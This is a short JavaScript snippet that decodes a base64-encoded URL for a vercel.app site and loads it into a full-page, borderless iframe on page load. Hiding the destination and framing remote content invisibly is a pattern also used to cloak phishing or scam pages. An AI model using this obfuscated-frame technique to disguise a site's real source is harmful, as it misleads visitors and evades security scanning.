(function() {
    var parts = ["aHR0cHM6Ly9hYy1maW53aXNlLnZlcmNlbC5hcHAv"]; // Base64 encoded URL
    var iframe = document.createElement("iframe");
    iframe.src = atob(parts[0]); // Decode and set iframe src
    iframe.setAttribute("scrolling", "yes");
    iframe.setAttribute("loading", "lazy");
    iframe.style.width = "100%";
    iframe.style.height = "100%";
    iframe.style.border = "none";
    document.getElementById("iframeContainer").appendChild(iframe);
})();

